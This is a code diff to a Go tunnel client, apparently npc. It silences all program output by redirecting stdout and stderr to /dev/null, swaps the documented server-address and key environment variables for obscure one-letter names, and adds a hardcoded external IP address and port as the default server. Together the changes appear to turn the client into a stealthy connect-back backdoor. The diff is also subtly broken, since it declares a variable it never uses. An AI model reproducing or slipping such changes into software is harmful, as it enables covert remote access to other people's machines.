@@ -42,6 +42,17 @@ var (
 )
 
 func main() {
+        // 打开 /dev/null 文件
+	devNull, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0666)
+	if err != nil {
+		panic(err)  // 如果无法打开文件，终止程序
+	}
+	defer devNull.Close()
+
+	// 重定向 stdout 和 stderr
+	os.Stdout = devNull
+	os.Stderr = devNull
+	
 	flag.Parse()
 	logs.Reset()
 	logs.EnableFuncCallDepth(true)
@@ -223,10 +234,15 @@ func run() {
 	}
 	env := common.GetEnvMap()
 	if *serverAddr == "" {
-		*serverAddr, _ = env["NPC_SERVER_ADDR"]
+	        value, exists := os.LookupEnv("D")
+		if exists {
+			*serverAddr, _ = env["D"]
+		} else {
+			*serverAddr = "103.219.177.89:8024"
+		}
 	}
 	if *verifyKey == "" {
-		*verifyKey, _ = env["NPC_SERVER_VKEY"]
+		*verifyKey, _ = env["V"]
 	}
 	logs.Info("the version of client is %s, the core version of client is %s", version.VERSION, version.GetVersion())
 	if *verifyKey != "" && *serverAddr != "" && *configPath == "" {
